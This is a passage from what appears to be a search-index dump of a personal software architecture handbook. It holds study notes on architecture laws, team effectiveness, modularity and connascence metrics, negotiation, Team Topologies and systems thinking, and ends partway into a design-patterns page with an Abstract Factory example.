quanta, \u0026hellip; then decided monolith/distrubuted based on that component thinking, etc \u0026hellip; Chapter component based thinking is a good transition for that.\nGet requirements\nDo first gathering of architectural characteristics\nDecide on technical vs domain partitioning\nFollow the component identifcation flow\nIncludes architectural characteristics and reflection Quanta Characeristics scoped correctly Iterative process Decide on the appropriate technical architecture\nDesigning a brownfield project # Todo \u0026hellip; Resources # Notes # * When greenfield (Define new characteristics) * Get requirements -\u0026gt; See components the process on how to define them, then characteristics, the quanta, ... then decided monolith/distrubuted based on that component thinking, etc ... * When replacing systems (review desire characteritics, and current once, etc...) * Did something change meanwhile ? Like stakeholders ? Or pure replace. * When ... * Tips of questions and concerns * Whem brownfield * How to first do you research to then move next "},{"id":100,"href":"/software-architecture/topics/laws-of-software-architecture/","title":"Laws of Software Architecture","section":"Software Architecture","content":" Laws of Software Architecture # First Law of Software Architecture # Everything in software architecture is a trade-off.\nSecond Law of Software Architecture # Why is more important than how.\nResources # Fundamentals of Software Architecture "},{"id":101,"href":"/software-architecture/topics/make-effective-teams/","title":"Make Effective Teams","section":"Software Architecture","content":" Making Development Teams Effective # Being able to make steams productive is one of the ways that software architects differentiate themselves from other software architects. Teams that feel left out of the loop or estranged from software architects (and also the architecture) often do not have the right level of guidance and right level of knowledge about various constraints on the system, and consequently do not implement the architecture correctly.\nOne of the roles of a software architect is to create and communicate constraints, or the box, in which developers can implement the architecture. Architects can create boundaries that are too tight, too lose, or just right.\nToo tight boundaries: Causes frustration to the developers. Too loose boundaries: Creates confusion to the developers. Appropriate boundaries: Creates effective teams. Architect Personalities # Control Freak Architect: Is one that defines Too tight boundaries Too fine-grained or too low-level focus and decisions. Steal the art of programming away. Common mistake for anyone who just moved from development to architecture. Armchair Architect: Is one that defines Too loose boundaries Hasn\u0026rsquo;t coded in a very long time (if at all) and doesn\u0026rsquo;t take the implementation details in account when creating an architecture. Disconnected from the teams. Sometimes is in way over their head regarding the business domain or technology. Architectures are often too high level, leaving too much up to the developers. Indicators: Not having enough time (or choosing) to spend with the development teams. Not fully understanding the business domain, business problem, or technology used. Not enough hands-on experience developing software. Not considering the implications associated with the implementation of the architecture solution. Effective Architect: Is one that defines Appropriate boundaries Requires working closely and collaborating with the team, and gaining the respect of the team as well. So, what is the right level of control to be effective? How Much Control? # To be an effective architect, knowing the right level of control to exert on a given development is key. This concept is known as Elastic Leadership. Here we deviate a bit and focus on the specific factors for software architecture. There are 5 factors/dimensions that we influence the amount of control you ideally exert. The idea is that you quantify the team on these 5 factors to determine the level of control, or rather \u0026ldquo;what type of architect personality\u0026rdquo; you need to play. As a project progresses, these 5 factors will change over time. Therefore, periodically \u0026ldquo;measure\u0026rdquo; these 5 factors and adjust your level of control accordingly.\nFactors Impacting Control # Team Familiarity: If members know each other, less control. If members don\u0026rsquo;t know each other, more control (to help facilitate collaboration between members). Team Size: Smaller teams (4 or less), less control. Bigger teams (12 or more), more control. Note: Think of Dunbar\u0026rsquo;s Number Overall Experience in their career (junior/senior) or business domain Few Juniors or familiar to business domain, less control (architect acts more as facilitator). Many Juniors or new to business domain, more control (architect acts more as mentor). Project Complexity Simple project, less control. Complex project, more control (be more available and assist with issues) Project Duration Short project, less control. Long project, more control. Determine Control # For each factor determine if it needs either less control (-20) also known as armchair architect, or more control (+20) also known as a control freak. Take the sum of all factors. The min value of the sum is -100 (hardcore armchair) and the max sum is +100 (hardcore control freak). Based on the sum you know if you need to be take a control freak (\u0026gt;0) or armchair role (\u0026lt;0) on a scale of 0 to 100.\nExample # Factor Value Rating Desired Role/Personality Team Familiarity New team members +20 Control Freak Team Size Small (4 members) -20 Armchair Overall Experience All experienced -20 Armchair Project Complexity Relatively Simple -20 Armchair Project Duration 2 months -20 Armchair Accumulated score -60 Armchair Obviously this is not an exact science, but rather a tool that just helps you guide the decision process.\nTeam Warning Signs # 3 factors come in place when considering the most effective development team size:\nProcess Loss (aka Brook\u0026rsquo;s Law): The more people you add to a project, the more time it will take. Actual productivity will always be less than the sum of all members potential (group potential). The difference between them being the process loss, caused by merge conflicts for example. If everyone is stepping on each others toes, the team might be too big. Pluralistic Ignorance: When everyone agrees to (but privately disagrees) a norm because they think they are missing the obvious (e.g. I guess I am the only one who doesn\u0026rsquo;t get it, so I won\u0026rsquo;t speak up, cause I might seem stupid or silly.). Pay attention to people\u0026rsquo;s body language and facial expressions, ask people what they really think and support anyone speaking up. Diffusion Of Responsibility: As the team grows, the communication is negatively impacted. Confusion about who is responsible for what on the team and things getting dropped are good sings the team is too large. This get\u0026rsquo;s very close to the bystander effect. Leveraging Checklists # Surgeons and pilots use them, they work, they are very non-invasive tools to do a sanity check if something was overlooked. Even when repeating a process various times, the most experienced can overlook things.\nAs always, balance is key, too many checklists will loose its effect. Making checklists too long works also contra-productive.\nTIP: State also the obvious in checklist, its usually the obvious that is skipped or missed.\nA few example checklist that are proven to work:\nDeveloper Code Completion Checklist Unit and Functional Testing Checklist Software Release Checklist Resources # Checklist Manifesto Dunbar\u0026rsquo;s Number Elastic Leadership Fundamentals of Software Architecture - Chapter 22 "},{"id":102,"href":"/software-architecture/topics/modules/","title":"Modules","section":"Software Architecture","content":" Modules # Different platforms offer different reuse mechanisms for code, but all support some way of grouping related code together in modules. This concept of modules is proven slippery to define. Therefore, we will use a definition from the Fundamentals of Software Architecture - Chapter 3 book.\nModularity is an organizing principle. IF an architect designs a system without paying attention to how the pieces wire together, a myriad of difficulties might be presented. Good modularity exemplifies the definition of an implicit architectural characteristic. No project features a requirement that asks the architect to ensure good modular distinction and communication, yet sustainable code bases require order and consistency.\nDefinition # Modularity describes a logical grouping of related code, which could be a group of classes in a OO language or functions in a functional language. This grouping does\u0026rsquo;t imply a physical separation, merely a logical one.\nWhen it comes to restructuring the architecture, the coupling encouraged by louse partitioning becomes an impediment to breaking the monolith apart. Thus, it is useful to talk about modularity as a concept separate from the physical separation forced or implied by a particular platform. Components are the physical manifestation of modules. Note that component can contain one ore more modules.\nMeasuring # Given its importance, there are a variety of language-agnostic metrics to help measure modularity. There are 3 key concepts: cohesion, coupling, and connascence.\nNOTE! # This measuring techniques come from the structured programming field. Some of it might also apply to OO and Functional paradigms, however, these metrics are originally targeting structured code bases.\nCohesion # Refers to what extent the parts of a module should be contained within the same module. Measuring how relates parts are to each other. Ideally a cohesive module is one where all the parts should be packaged together. Attempting to divide a cohesive module would only result in increased coupling, and decreased readability.\nTypes of Cohesion - From best to worst: Functional Cohesion Sequential Cohesion Communication Cohesion Procedural Cohesion Temporal Cohesion Logical Cohesion Coincidental Cohesion The Chidamber and Kemerer Object-oriented metrics suite are a well known set of metrics that allows to measure the \u0026ldquo;Lack of Cohesion\u0026rdquo;, also known as the LCOM (Lack of Cohesion of Methods) formula. LCOM: The sum of sets ofg methods not shared via sharing fields. Useful to analyze code base in order to move from one architectural style to another. Only measures structural lack of cohesion; not to determine logically if particular pieces fit together. It tells us HOW but not WHY. Coupling # A basic measuring method would be by just measuring afferent and efferent coupling:\nAfferent Coupling: Incoming connections/dependencies to a code artifact. (ingress/incoming) Efferent Coupling: Outgoing connections/dependencies to a code artifact. (egress/outgoing) The following approach allows for a deeper evaluation than the basic afferent/efferent measurements.\nAbstractness: The ratio of abstract artifacts (abstract classes, interfaces, \u0026hellip;) to concrete artifacts (implementation). Instability: The ratio of efferent coupling to the cum of both efferent and afferent coupling. Determines the volatility of a code base. A code base that has high instability breaks more easily because of the high coupling. If a class calls to many other classes to delegate work, the calling class shows high sensitivity to breakage if one or more of the called methods change. Distance from Main Sequence: Distance = | Abstractness + Instability - 1 | This is a derived metric from Abstractness and Instability. This metric imagines an ideal relationship between abstractness and instability; classes that fall near this idealized line exhibit a health mixture of these two competing concepts. Diagram There are 2 zones where a code artifact can fall Zone of uselessness: Code that is too abstract becomes difficult to use. Zone of pain: Code with too much implementation and not enough abstraction becomes brittle and hard to maintain. Connascence # A refinement of the afferent/efferent measures towards OO.\nTwo components are connascence if a change in one would require the other to be modified in order to maintain the overall correctness of the system.\nStatic Connascence # This is analyzed at build/source code level.\nSource-code-level coupling, the degree to which something is coupled, either afferent or efferent:\nConnascence of Name (CoN): Multiple components must agree on the name of an entity. Example: createUser() and then updatePerson() when it\u0026rsquo;s about the same entity. Connascence of Type (CoT): Multiple components must agree on the type of an entity. Example: Using the same language type for the same entity. Connascence of Meaning (CoM) or Connascence of Convention (CoC): Multiple components must agree on the meaning of particular values. Example: int TRUE = 1; int FALSE = 0, imagine someone changing that around. Connascence of Position (CoP): Multiple entities must agree on the order of values. Example: createUser(string name, string surname) vs updateUser(string surname, string name) Connascence of Algorithm (CoA): Multiple components must agree on a particular algorithm. Example: If a certain hashing algorithm is chosen, 2 related components must use the same. Dynamic Connascence # This is analyzed at runtime.\nConnascence of Execution (CoE): The order of execution of multiple components is important. Example: You must call code in certain precedence/order to work. You can\u0026rsquo;t do article.publish() while article.setTile() should be called first. Connascence of Timing (CoT): The timing of the execution of multiple components is important. Example: Race condition challenges Connascence of Values (CoV): Occurs when several values relate on one another and must change together. Example: You can not change any of the coordinates of a square data structure without changing the other coordinates to adhere to the requirements of a square (each side must be equal, corners 90 degrees, etc\u0026hellip;). You can see how this can relate to \u0026ldquo;transactions\u0026rdquo; and especially in \u0026ldquo;distributed\u0026rdquo; systems. All values must change or not at all, in an (if possible) atomic approach. You try to keep redundant data in sync sort to say. CoV is about agreeing on a value. If any part of the system decides to change the value, all other parts must be updated to stay consistent. Connascence of Identity (CoI): Occurs when several values relate on one another and must change together. Example: Sounds similar to CoV, but there is a difference. This is about the \u0026ldquo;SAME IDENTITY\u0026rdquo; that multiple components refer to. CoI is about agreeing on a specific instance. It\u0026rsquo;s not about the value itself but about the specific identity or reference to an object/resource. Connascence Properties # Connascence is an analysis tool for architects and developers, some properties of Connascence help developers use it wisely.\nStrength: The ease which one can refactor that type of coupling. One can improve the coupling characteristics of the code by refactoring towards better types of connascence. See strength Diagram that is an excellent refactoring guide. The strongest (dynamic)Connascence types are at the bottom, and you want to start your refactoring focus there and then work your way up to the more weaker ones (Static). Locality: Proximity between the modules. Proximal code (in same module) typically has more and higher forms of connascence than more separated code (different modules). One must consider strength and locality together. Strong forms of connascence in the same module are less troublesome than between separate modules. Degree: Size of impact, does it impact a few or many classes? A strong connascence is ok if the degree/impact is low. Like not having many components, but code bases grow\u0026hellip; How to use connascence to improve modularity # Minimize overall connascence by breaking the system unto encapsulated elements. Minimize any remaining connascence that crosses encapsulation boundaries. Maximize the connascence within encapsulation boundaries. Conclusions # Coupling originates mostly from structured programming, connascence goes deeper and questions how things are coupled together. Naturally there is some overlap here. As architect you care more on HOW things modules are coupled, not the degree. These metrics were designed in a time when distributed architectures were not mainstream yet, so they work well for code bases, but there are challenges on a higher level. See Architectural Characteristics on how to thing more about connascence on higher architectural level. Resources # Clean Architecture Fundamentals of Software Architecture - Chapter 3 "},{"id":103,"href":"/software-architecture/topics/negotiation-and-leadership-skills/","title":"Negotiation and Leadership Skills","section":"Software Architecture","content":" Negotiation and Leadership Skill # These are hard skills to obtain. This topic cannot make you an expert overnight, the techniques introduced here are a good starting point for gaining these important skills. The reason we cover these skills is because a Software Architect must understand the political climate of the enterprise and navigate the politics.\nReason being that almost every decision will be challenged. Developers that think they know more than the architect on a particular part, other architect who think they have a better approach, or business stakeholders that consider your decision to be too expensive. Your goal is not to go to war, but to find the best outcomes for the organization.\nNegotiation and Facilitation # Costs can be a deal breaker. You might need to hone your story and understanding to justify the cost. Else you might need to find alternatives that work better cost wise. Usually it is not binary a negotiation, but a conversation to find common ground and work within its boundaries. Remember, it\u0026rsquo;s always about trade-offs.\nGENERAL TIP: Leave your ego at the door\nNegotiating with Business Stakeholders # TIP: Leverage the use of grammar and buzzwords to better understand the situation Don\u0026rsquo;t ignore the buzzwords or nonsense grammar, these give tremendous insights on what the concerns are from the business stakeholders, this allows you to better understand the real concerns. You can also use the same grammar and buzzwords to ask follow-up questions. \u0026ldquo;I needed it yesterday\u0026rdquo; : Time To Market matters. \u0026ldquo;It must be lightening fast\u0026rdquo; : Performance matters. \u0026ldquo;I want 8 nines availability\u0026rdquo; : Availability matters. TIP: Gather as much information as possible before entering into a negotiation This allows to navigate the negotiation in a constructive dialog. If you know the stakeholder mentioned they want \u0026ldquo;8 nines\u0026rdquo;, have a table ready with the uptime percentage and the downtime per year/day which can help the stakeholder reflect the difference between 3 and 8 nines. Help them understand what they\u0026rsquo;re really asking. Having information at your finger tips allows for a constructive dialog. Do make sure to steer it in such a way. TIP: When all else fails, state things in terms of cost and time This should be a last resort, starting of with \u0026ldquo;that\u0026rsquo;s too expensive\u0026rdquo; can start of a negotiation of the wrong foot. Ideally cost and time are considered once an agreement is reached and if they are relevant. TIP: Leverage the \u0026ldquo;divide and conquer\u0026rdquo; rule to qualify demands or requirements Break down the demands or requirements, or consider adjusting scope. Maybe the 8 nines are only relevant for a part of the system. TIP: Prioritize strategically Stakeholders can \u0026ldquo;demand\u0026rdquo; certain features or functionality, or a solution to a problem that shouldn\u0026rsquo;t exist in the first place. You can consider strategically focussing on the core of a problem, solve that, and then circle back to see if the need for given feature/requirement exists. Example: Business stakeholders want a UI to change the behaviors/parameters of an automated cost approval. You can then focus first on designing and better analyzing the actual automation logic. When that is done (and maybe even delivered), you can circle back to ask, do you still need this UI? They might realize they don\u0026rsquo;t need it at all. A way to deal with this is to plan the UI component later on the roadmap, so you can then gather feedback to see if if the concerns are still valid. After all, this is what being agile is about. Negotiating with Other Architects # Between architects the seniority can be in the way (ego), competitiveness, too argumentive, and could easily get personal. Some tips to deal with such situations.\nTIP: Always remember that demonstration defeats discussion\nEvery situation is different, just \u0026ldquo;googling it\u0026rdquo; doesn\u0026rsquo;t exist, so every system is different. Run a comparison between the competing options and show the results. TIP: Avoid being too argumentive or letting things get too personal in a negotiation - calm leadership combined with clear and concise reasoning will always win a negotiation.\nIf things get too heated, park the discussion and come back at it later when all parties have calmed down. Negotiating with Developers # Don\u0026rsquo;t leverage your title as architect to tell others what to do. Work with them and gain respect. Development teams can feel disconnected from architecture or the architect. As a result they feal out of the loop with regard to decisions that impact them. This is the manifestation of the Ivory Tower Anti-Pattern.\nTIP: When convincing developers to adopt an architecture decision or to do a specific task, provide a justification rather than \u0026ldquo;dictating from on high\u0026rdquo;.\nDevelopers care about \u0026ldquo;why\u0026rdquo;, they don\u0026rsquo;t like to be \u0026ldquo;just told what to do\u0026rdquo;, you (as an architect) probably doesn\u0026rsquo;t like it either. Use of language: Don\u0026rsquo;t use compelling speech (e.g. \u0026ldquo;You MUST\u0026hellip;\u0026rdquo;) TIP: If a developer disagrees with a decision, have them arrive at the solution on their own.\nTell the developer take their choice if they can \u0026ldquo;show\u0026rdquo; or \u0026ldquo;validate\u0026rdquo; (don\u0026rsquo;t say proof) that their options does tackle concerns. Example: The team will use Framework X if they can show how to address the security requirements\u0026quot; Either the developers fails to show/validate this, so they come to their own conclusion, so you win their buy-in. That\u0026rsquo;s a win. Either the developers succeeds to show/validate this, that is still a win, the architect learns also something new, and the original concerns are addressed, so Framework X DOES seem to be the better option. The Software Architect as a Leader # 50% about being an effective software architect is having good people skills, facilitation skills, and leadership skills. Here we cover some leadership techniques that you as an architect can leverage.\nThe 4 C\u0026rsquo;s of Architecture # Developers and architects love complexity. Developers are drawn to complexity like months to a flame, frequently with the same result. We have essential complexity (we have a hard problem), and we have accidental complexity (we have made a problem hard).\nTo avoid accidental complexity there is the 4 C\u0026rsquo;s of architecture:\nCommunication Collaboration Conciseness Clarity These 4 factors work together to create an effective collaborator and communicator.\nBe Pragmatic, Yet Visionary # Visionary # Thinking about or planning the future with imagination or wisdom. Being a visionary means applying strategic thinking to a problem.\nPragmatic # Dealing with things sensibly and realistically in a way that is based on practical rather than theoretical considerations.\nBeing pragmatic is taking following factors and constraints in account when creating a solution:\nBudget constraints and other cost-based factors. Tome constraints and other time-based factors. Skill set and skill level of the development team. Trade-offs and implications associated with an architecture decision Technical limitations of a proposed architectural design or solution Putting them together # Find an appropriate balance between being pragmatic while still applying imagination and wisdom to solving problems. Business stakeholders appreciate visionary solutions that fit within a set of constraints, and developers will appreciate having a practical (rather than theoretical solution to implement).\nLeading Teams By Example # Lead through example, not by title. This is the most efficient way to gather respect from others. Don\u0026rsquo;t tell what and how it must be, ask questions, ask \u0026ldquo;what do you think of\u0026hellip;\u0026rdquo;, \u0026ldquo;have you considered\u0026rdquo;, \u0026hellip; In coaching you help others find the questions, you don\u0026rsquo;t tell them the solution.\nUse people their names when you talk to them, it bonds and is more personal.\nIntegrating with the Development Team # Meetings # Key of being an effective software architect is making more time for the development team, this means controlling meetings.\nImposed Meetings (invited to a meeting): Many invites are simply to keep you in the loop on information discussed, meeting notes are for that. Ask for a meeting agenda ahead of time to help qualify if you are really needed at the meeting or not. Imposes Meetings (you call the meeting) Keep to absolute minimum, especially with developers, respect their time and give them blocks of uninterrupted focus. Often emails are enough to communicate. Others # Sit with development teams physically. Block time to converse with the development teams. Resources # Fundamentals of Software Architecture - Chapter 23 "},{"id":104,"href":"/software-architecture/topics/software-architect-role/","title":"Software Architect Role","section":"Software Architecture","content":" What does a Software Architect do? # based on Fundamentals of Software Architecture\nArchitectural wisdom and ideas can very specific for their time they were documented. As technology constantly changes, many aspects regarding architecture will change along with that. An example would be the introduction of tools like Kubernetes, which made the restructuring of any software topology cheap, which allows for a more evolving topology. A decade ago, such decisions were costly, so mostly final, once they were made.\nThe core responsibilities that we discuss here are relevant for all type of architects (including infrastructure).\nCore Responsibilities # Make architecture decisions Designs and design principles must guide technology decisions not dictate them. You can instruct to use \u0026ldquo;reactive-based framework for web development\u0026rdquo; but not which one. Continually analyze the architecture Analyze the current architecture and technology environment and recommend solutions for improvement. \u0026ldquo;How viable is the architecture from a few years ago, today? Given the changes in both business and technology\u0026rdquo; This includes test/release environments, which allows for agility. Remind DevOps principles and practices. Example: Potentially do periodic Risk Assessments Keep current with latest technology and industry trends Actively ensure compliance with decisions Technical breadth over technical depth Seek aggressively experience or exposure to multiple languages, platforms, and technologies. Have business domain knowledge Important for good communication, you do need to align with business needs. Possess interpersonal skills Teamwork, facilitation, and leadership. Understand and navigate politics Must understand the political climate and be able to navigate the politics. In addition to these core expectations, there are many more and this will change as technology and scale changes.\nNote that (7) and (8) are crucial for the ability of the architect to have effective impact and to execute change.\nCulture # Agile development avoids big design up-front (BDUF) with a simple belief that âthe best architectures, requirements, and designs emerge from self-organizing teams [1].â This yields the practice of emergent designâdefining and extending the architecture only as necessary to deliver the next increment of functionality. These problems can result in poor solution performance, unfavorable economic outcomes, and delayed time-to-market. Organizations overcome these problems by balancing emergent design with intentional architecture, which requires some centralized planning and cross-team coordination. Both are implemented with Enablers and, together, âpaveâ the architectural runway (Figure 1).\nsource: SAFE - Architecture Runway Resources # SAFE - Architecture Runway "},{"id":105,"href":"/software-architecture/topics/systems-thinking/","title":"Systems Thinking","section":"Software Architecture","content":" Systems Thinking # Definition # A \u0026ldquo;system\u0026rdquo; in systems thinking is a set of interconnected elements, which can be subsystems in their own right, organized within defined boundaries. These elements function cohesively to achieve a common purpose or produce specific outcomes, influenced by the system\u0026rsquo;s structure and internal interactions.\nInterconnected Elements: A system contains one or many elements which are interconnected. Can be subsystems in their own right: Any element can be a high level abstraction of a whole system of its own. Organized within defined boundaries: A system as clear, set boundaries, anything outside the boundaries is not a part of the system. However, a boundary can be adjacent to other systems which the systems is interconnected to. Elements function cohesively to achieve a common purpose or produce specific outcomes: The structure and behavior of these interconnected elements produce certain outcome. Building Blocks # \u0026hellip;todo\nResources # Raw Ideas # The concept of a \u0026ldquo;system\u0026rdquo; can be applied to pretty much anything around us. The human bod is a\nFor a System we can find a definition like:\na set of things working together as parts of a mechanism or an interconnecting network; a complex whole.\nOr more specifically for Software Systems:\nSystem software is a set of generalized programs that manage the resources of the computer, such as the central processing unit, communication links, and peripheral devices\nHowever, as you will read further about Evolutionary Architecture you might understand why I personally like to keep the following definition.:\na group of body organs that together perform one or more vital functions\nLastly, if we look at physics, we can also see the usage of the term:\nThe law of conservation of energy states that energy can neither be created nor destroyed - only converted from one form of energy to another. This means that a system always has the same amount of energy, unless it\u0026rsquo;s added from the outside.\nEither way, a System is a concept, far more general than software/IT systems. There is a field of Systems Thinking. If you want to read more about it, I suggest Thinking in Systems: A Primer.\nKeep in mind, a system can exist out of smaller systems or be a part of a bigger system. Usually a system has also adjacent systems. Deciding on what parts you consider to include in your \u0026ldquo;view\u0026rdquo; of the system is important and challenging.\n"},{"id":106,"href":"/software-architecture/topics/team-topologies/","title":"Team Topologies","section":"Software Architecture","content":" Team Topologies # Although Team Topologies is strictly not about architecture, it has a huge impact and connection on how we structure team ownership and our architecture according to Conways law. Therefore, I felt this made sense to cover in the Architecture Handbook. What is Team Topologies? # An adaptive model to organization design.\n\u0026ldquo;Team Topologies\u0026rdquo; is a book that provides a framework for organizing and optimizing software development teams within an organization. The book emphasizes the importance of adapting team structures and interactions to the specific context of the organization and its technological landscape. This is all based on the Reverse Conway Maneuver. By embracing Conways Law, this framework tries to help create efficient teams that will also result in your desired architecture. As always, frameworks come with their fair share of criticism, but it doesn\u0026rsquo;t make it worth covering and using as input in your decision process.\nTeam topologies is a framework that gives you the tools, concepts, and patterns that help you reason and navigate the challenges of organizational design, with Conway\u0026rsquo;s law in view.\nWhy Team Topologies? # Organization not only need to strive for autonomous teams, they also need to continuously think about and evolve themselves in order to deliver value quickly to the customers.\nKey Concepts # These concepts are used as building blocks on how to reason and think of structuring teams ownership and responsibilities.\nConway Law # Taking Conways Law in consideration, we can use this to our advantage to create teams that result in the architecture/system that we want, while making the teams also more efficient.\nFlow Of Change # Refers to how changes in software and systems are managed and how they flow through an organization\u0026rsquo;s structure of teams.\nImage: Visual Representation\nTeam Types # Stream-aligned team aligned to a flow of work from (usually) a segment of the business domain. These are âYou Built It, You Run Itâ teams. No hand-offs to other teams for any purpose. Primary team type Enabling team helps a Stream-aligned team to overcome obstacles. Also detects missing capabilities. Reduce load for stream-aligned teams, by acting as service providers (e.g learn new things while retaining focus). Complicated Subsystem team where significant mathematics/calculation/technical expertise is needed. Reduce load for stream-aligned teams, where stream-aligned teams are the internal customer of the subsystem. Platform team a grouping of other team types that provide a compelling internal product to accelerate delivery by Stream-aligned teams. Reduce load for stream-aligned teams, where stream-aligned teams are the internal customer of the platform. The goal of the these team types, is to manage cognitive load for teams by defining clear responsibilities and boundaries.\nImage: Visual Representation\nInteraction Modes # There are only three ways in which team should interact:\nCollaboration: working together for a defined period of time to discover new things (APIs, practices, technologies, etc.) X-as-a-Service: one team provides and one team consumes something âas a Serviceâ Facilitation: one team helps and mentors another team Image: Visual Representation\nRelation To Systems Thinking # Notice that we recognize the key parts of any generic \u0026ldquo;system\u0026rdquo; from Systems Thinking.\nThe Organization: The top level system we view. Team Types: Are the \u0026ldquo;Components\u0026rdquo; or \u0026ldquo;Elements\u0026rdquo; that our system is made of up and what their boundaries are. Interaction Modes: How Components/Elements of a system are interconnected with each other. Conway\u0026rsquo;s Law \u0026amp; Reverse Conway Maneuver # Part I (Teams as the means of Delivery) of the Team Topologies Book\nThe Issue with Traditional, top-down approach to team organization (Org Charts) # Conway\u0026rsquo;s law suggest major gains from designing software architecture and team interactions together, since they are similar forces. Team Topologies clarifies team purpose and responsibilities, increasing the effectiveness of their interrelationships. Team Topologies takes a humanistic approach to building software systems while setting up the organizations for strategic adaptability. Conway\u0026rsquo;s Law and Why It Matters # Organizations are constrained to produce designs that reflect communication paths. The design of the organization constrains the \u0026ldquo;solution search space\u0026rdquo; limiting possible software designs. Requiring everyone to communicate with everyone else is a recipe for a mess. Choose Software Architectures that encourage team-scoped flow. Limiting communication paths to well-defined team interactions produces modular, decoupled systems. Team-First Thinking # The team is the most effective means of software delivery, not individuals. Limit the size of multi-team groupings within the organization based on dunbars number. Restrict team responsibilities to match te maximum team cognitive load. Establish clear boundaries of responsibilities for teams. Change the team working environment to help teams succeed. Team Patterns # Part II (Team Topologies that work for flow) of the Team Topologies Book\nStatic Team Topologies # Ad hoc or constant changing team design slows down software delivery. There is no single definitive team topology but several inadequate topologies for any one organization. Technical and cultural maturity, org scale, and engineering discipline are critical aspects when considering which topology to adopt. In particular, the feature-team/product-team is powerful but only works with a supportive surrounding environment. Splitting a team\u0026rsquo;s responsibilities can break down silos and empower other teams. The 4 Fundamental Team Topologies # The 4 fundamental team topologies simplify modern software team interactions. Mapping common industry team types to the fundamental topologies sets up organizations for success, removing gray areas of ownership and overloaded/underloaded teams. The main topology is (business domain) stream-aligned; all other topologies support this type. The other topologies are enabling, complicated-subsystems, and platform. The topologies are often \u0026ldquo;fractal\u0026rdquo; (self-similar) at large scale: teams of teams. Choose Team-First Boundaries # Choose software boundaries using the team-first approach. Beware of hidden monoliths and coupling in the software-delivery chain. Use software boundaries defined by business-domain bounded contexts. Consider alternative software boundaries when necessary and suitable. Evolving The Organization Design # Part III (Evolving team interactions for innovation and rapid delivery) of the Team Topologies Book\nTeam Interaction Modes # Choose specific team interaction modes to enhance software delivery. Choose between 3 interaction modes - collaboration, X-as-a-Service, and facilitating - to help teams provide and evolve services to other teams. Collaboration can be a powerful driver for innovation but can also reduce flow. X-as-a-Service can help other teams deliver quickly but only if the boundary is suitable. Facilitating helps to avoid cross-team challenges and detects problems. Evolve Team Structures With Organizational Sensing # Use different team topologies simultaneously for strategic advantage. Change team topologies and interactions to accelerate adoption of new approaches. Differentiate between explore, exploit, sustain, retire phases using team topologies. Expect multiple, simultaneous team topologies to meet different needs. Recognize triggers or organizational change. Treat operations as high-fidelity sensory input for self-steering. Conclusion: The Next-Generation Digital Operating Model # Combine a team-first approach with Conway\u0026rsquo;s law, the 4 fundamental topologies, team interaction modes, topology evolution, and organizational sensing. Get Started: begin with the team, identify streams, identify the thinnest viable platform, identify capability gaps, and practice team interactions. Resources # Team Topologies Book Team Topologies Website Talk - Architect for FLow - DDD \u0026amp; Team Topologies by Susanne Kaiser Business Harvard - A Leaderâs Framework for Decision Making "},{"id":107,"href":"/software-architecture/topics/threat-modeling/","title":"Threat Modeling","section":"Software Architecture","content":" Threat Modeling # Todo\u0026hellip;\nResources # Threat Modeling: Designing for Security "},{"id":108,"href":"/software-design/","title":"Software Design","section":"","content":" Design Patterns # Design patterns are battle proven (most of them) solutions to common problems that developers face on daily base. Knowing many help you solve problems in a clean, efficient way. The solutions might be a big complex when you look at the code for the first time and you are not familiar with given pattern. Knowing multiple patterns help you recognize applied patterns, think more abstract about your code and solve your problems in a clean and efficient way.\nOpposed of design patterns, there are also antipatterns. Meaning, known patterns that are applied but are known to be a bad practice. Knowning these helps you identify issues in the code and keeps you from implementing a bad solution to your problem.\nOur design patterns can be grouped in groups that target a certain set of problems. The main types of patterns are:\nCreational patterns Structural patterns Behavioral patterns Patterns can be applicable on small units of code or also on architectural level. This does not always work out for every pattern, but often there might be derived patterns for architectural level from their code unit equivalents.\nCriticism # There has been a lot of criticism about (various) design patterns that they encourage wrong solutions. It goes without a saying that patterns are rather guidelines and a source to challenge your solutions on a more abstract level. Design patterns are not the holy gray but knowing some will help you shape your own opinion and skills to solve problems more efficiently and better abstract thinking. More can be found here.\nGeneral principles # In many sitations the use of the new keyword for creating an object is abstracted away to a single function that \u0026ldquo;creates\u0026rdquo; instances. The idea is the code should be unaware of which concrete class should be used. This would result in a single place in the code base to change the concrete class being used in the entire solution. (e.g. I have a IDataStore interface, and I have a MongoDB implementation and a MySQL implementation, if we want to be able to change the implementation easily, then we should preferably only change one line of code instead of all the instantiation statements) Patterns can be complementary, so you could use several different patterns on solving the same problem. Patterns # Creational patterns # In software engineering, creational design patterns are design patterns that deal with object creation mechanisms, trying to create objects in a manner suitable to the situation. The basic form of object creation could result in design problems or added complexity to the design. Creational design patterns solve this problem by somehow controlling this object creation.\nAbstract Factory # Group factory functions semantically together that instantiates concrete classes that are closely related to each other.\nWhen we like to avoid using the new keyword where possible, the abstract factory, unlike just a regular factory, the abstract factory instantiates the concete classes which are related to each other.\nLet\u0026rsquo;s say we have the classes CPU and GPU, which we would like to fetch from our OS. As our application is (presumed in this example) OS agnostic, the concrete class with logic on how to interact with the CPU and GPU would differ based on the underlying OS.\nThe idea is to have a factory (e.g. HardWareInterfaceFactory) that can create the proper CPU and GPU concrete classes depending on the OS that the application is running.\n// Abstract classes class CPU {...} class GPU {...} // CPU concrete classes class MacOsCPU : CPU{...}; class WindowsOSCPU : CPU{...} // GPU concrete classes class MacOsGPU : GPU{...}; class WindowsOSGPU : GPU {...} // OS specific abstract factories class MacOsHardWareInterface : HardWareInterfaceFactory { public CPU createCpu() { return new MacOsCPU() }; public CPU createGpu() { return new MacOsCPU() }; } class WindowsHardWareInterface : HardWareInterfaceFactory { public CPU createCpu() { return new WindowsOSCPU() }; public CPU createGpu() { return new WindowsOSGPU() }; } // Generic abstract factory that brings all factories together abstract class HardWareInterfaceFactory{ // This returns the proper instance for given OS static HardWareInterfaceFactory getFactoryForOs(os){ if(os == \u0026#39;macos\u0026#39;){ return new MacOsHardWareInterface(); }else if(os == \u0026#39;windows\u0026#39;){ return new WindowsHardWareInterface(); }else{ throw new Exception(\u0026#39;OS not supported\u0026#39;); } } // Here we define the function signature that each HardWareInterface should have. abstract CPU createCpu(); abstract GPU createGpu(); } // usage var factory = HardWareInterfaceFactory.getFactoryForOs(\u0026#34;windows\u0026#34;); var cpu = factory.createCpu(); ... happy instantiation ... Builder # When you have a certain process, that always executes the same steps, but each step might need another input depending what you try to achieve, the builder pattern is a good approach. We create an abstract class that will be the \u0026ldquo;builder\u0026rdquo; and dictates which steps should be executed. Then you can use concrete builders that know what inputs are required for a given desired output.\nThis works well when you have a well \u0026ldquo;defined\u0026rdquo; business process but takes different inputs depending on what deriative it is from the business process. Like you have the 